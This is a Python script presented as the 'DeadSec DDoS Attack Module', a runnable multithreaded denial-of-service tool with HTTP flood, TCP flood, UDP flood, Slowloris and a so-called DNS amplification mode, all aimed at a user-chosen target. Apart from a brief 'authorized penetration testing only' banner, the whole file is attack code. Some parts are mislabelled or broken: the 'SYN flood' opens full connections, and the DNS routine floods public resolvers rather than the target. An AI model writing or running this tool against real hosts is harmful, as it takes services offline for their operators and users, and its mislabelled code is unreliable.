#!/usr/bin/env python3
"""
DeadSec DDoS Attack Module
Multi-vector distributed denial of service attack tool

ATTACK VECTORS:
- HTTP Flood (GET/POST)
- TCP SYN Flood
- UDP Flood
- Slowloris Attack
- DNS Amplification
- Multi-threaded/Multi-process

⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
"""

import socket
import threading
import random
import time
import sys
import argparse
from urllib.parse import urlparse

# Attack configuration
ATTACK_ACTIVE = True
PACKETS_SENT = 0
LOCK = threading.Lock()

# User agents for HTTP attacks
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15',
]

def log(message):
    """Thread-safe logging"""
    with LOCK:
        print(f"[DEADSEC] {message}")

def increment_counter():
    """Thread-safe packet counter"""
    global PACKETS_SENT
    with LOCK:
        PACKETS_SENT += 1

def http_flood(target_url, duration, thread_id):
    """
    HTTP GET/POST flood attack
    Overwhelms target with rapid HTTP requests
    """
    global ATTACK_ACTIVE
    
    try:
        parsed = urlparse(target_url)
        host = parsed.netloc or parsed.path
        path = parsed.path if parsed.path else '/'
        port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
        
        end_time = time.time() + duration
        
        while ATTACK_ACTIVE and time.time() < end_time:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                
                # Random user agent
                user_agent = random.choice(USER_AGENTS)
                
                # Craft HTTP request
                request = f"GET {path}?rand={random.randint(1, 999999)} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += f"User-Agent: {user_agent}\r\n"
                request += "Connection: keep-alive\r\n"
                request += "Accept: text/html,application/xhtml+xml,application/xml\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                sock.recv(1024)  # Receive response
                sock.close()
                
                increment_counter()
                
            except Exception:
                pass  # Silent fail, continue attacking
                
    except Exception as e:
        log(f"Thread {thread_id} error: {e}")

def tcp_flood(target_ip, target_port, duration, thread_id):
    """
    TCP SYN flood attack
    Exhausts server resources with connection requests
    """
    global ATTACK_ACTIVE
    
    end_time = time.time() + duration
    
    while ATTACK_ACTIVE and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(b"X" * 1024)
            sock.close()
            increment_counter()
        except Exception:
            pass  # Silent fail

def udp_flood(target_ip, target_port, duration, thread_id):
    """
    UDP flood attack
    Saturates bandwidth with UDP packets
    """
    global ATTACK_ACTIVE
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(1024)  # Random payload
    
    end_time = time.time() + duration
    
    while ATTACK_ACTIVE and time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, target_port))
            increment_counter()
        except Exception:
            pass  # Silent fail

def slowloris_attack(target_ip, target_port, duration, thread_id):
    """
    Slowloris attack
    Keeps connections open by sending partial HTTP headers
    """
    global ATTACK_ACTIVE
    
    sockets = []
    end_time = time.time() + duration
    
    try:
        # Create multiple sockets
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((target_ip, target_port))
                
                # Send partial HTTP header
                sock.send(b"GET / HTTP/1.1\r\n")
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send(b"User-Agent: Mozilla/5.0\r\n")
                
                sockets.append(sock)
                increment_counter()
            except Exception:
                pass
        
        # Keep connections alive
        while ATTACK_ACTIVE and time.time() < end_time:
            for sock in sockets:
                try:
                    sock.send(b"X-a: b\r\n")
                    increment_counter()
                except Exception:
                    sockets.remove(sock)
            
            time.sleep(10)  # Send keep-alive every 10 seconds
            
    except Exception as e:
        log(f"Slowloris thread {thread_id} error: {e}")
    finally:
        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

def dns_amplification(target_ip, duration, thread_id):
    """
    DNS amplification attack
    Uses DNS servers to amplify attack traffic
    """
    global ATTACK_ACTIVE
    
    # Common DNS servers (don't use Google/Cloudflare - they have protection)
    dns_servers = [
        '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1'
    ]
    
    # Craft DNS query (spoofed source IP would be target_ip in real attack)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # DNS query for ANY record (largest response)
    dns_query = b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    dns_query += b'\x03www\x06google\x03com\x00\x00\xff\x00\x01'
    
    end_time = time.time() + duration
    
    while ATTACK_ACTIVE and time.time() < end_time:
        for dns_server in dns_servers:
            try:
                sock.sendto(dns_query, (dns_server, 53))
                increment_counter()
            except Exception:
                pass

def status_monitor(duration):
    """Monitor and display attack statistics"""
    global ATTACK_ACTIVE, PACKETS_SENT
    
    start_time = time.time()
    
    while ATTACK_ACTIVE and (time.time() - start_time) < duration:
        elapsed = int(time.time() - start_time)
        rate = PACKETS_SENT / elapsed if elapsed > 0 else 0
        
        log(f"⚡ Attack Status: {PACKETS_SENT} packets sent | {rate:.2f} pps | {duration - elapsed}s remaining")
        time.sleep(5)

def launch_attack(target, port, attack_type, threads, duration):
    """
    Launch distributed denial of service attack
    
    Args:
        target: IP address or domain name
        port: Target port (for TCP/UDP attacks)
        attack_type: http, tcp, udp, slowloris, dns
        threads: Number of attack threads
        duration: Attack duration in seconds
    """
    global ATTACK_ACTIVE, PACKETS_SENT
    
    log("=" * 70)
    log("💀 DEADSEC DDoS ATTACK INITIATED 💀")
    log("=" * 70)
    log(f"Target: {target}")
    log(f"Port: {port}")
    log(f"Attack Type: {attack_type.upper()}")
    log(f"Threads: {threads}")
    log(f"Duration: {duration} seconds")
    log("=" * 70)
    
    ATTACK_ACTIVE = True
    PACKETS_SENT = 0
    
    # Resolve domain to IP if needed
    target_ip = target
    if attack_type != 'http':
        try:
            target_ip = socket.gethostbyname(target)
            log(f"Resolved {target} -> {target_ip}")
        except Exception as e:
            log(f"Failed to resolve {target}: {e}")
            return
    
    # Start status monitor
    monitor_thread = threading.Thread(target=status_monitor, args=(duration,))
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Launch attack threads
    thread_list = []
    
    for i in range(threads):
        if attack_type == 'http':
            t = threading.Thread(target=http_flood, args=(target, duration, i))
        elif attack_type == 'tcp':
            t = threading.Thread(target=tcp_flood, args=(target_ip, port, duration, i))
        elif attack_type == 'udp':
            t = threading.Thread(target=udp_flood, args=(target_ip, port, duration, i))
        elif attack_type == 'slowloris':
            t = threading.Thread(target=slowloris_attack, args=(target_ip, port, duration, i))
        elif attack_type == 'dns':
            t = threading.Thread(target=dns_amplification, args=(target_ip, duration, i))
        else:
            log(f"Unknown attack type: {attack_type}")
            return
        
        t.daemon = True
        t.start()
        thread_list.append(t)
    
    log(f"✓ Launched {len(thread_list)} attack threads")
    
    # Wait for completion
    time.sleep(duration)
    ATTACK_ACTIVE = False
    
    # Wait for threads to finish
    for t in thread_list:
        t.join(timeout=5)
    
    log("=" * 70)
    log(f"💀 ATTACK COMPLETE 💀")
    log(f"Total packets sent: {PACKETS_SENT}")
    log(f"Average rate: {PACKETS_SENT / duration:.2f} packets/second")
    log("=" * 70)

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='DeadSec DDoS Attack Module - Multi-Vector DDoS Tool',
        epilog='⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️'
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-a', '--attack', choices=['http', 'tcp', 'udp', 'slowloris', 'dns'], 
                        default='http', help='Attack type (default: http)')
    parser.add_argument('-T', '--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    
    args = parser.parse_args()
    
    try:
        launch_attack(args.target, args.port, args.attack, args.threads, args.duration)
    except KeyboardInterrupt:
        log("\n⚠️ Attack interrupted by user")
        ATTACK_ACTIVE = False
        sys.exit(0)

if __name__ == '__main__':
    main()
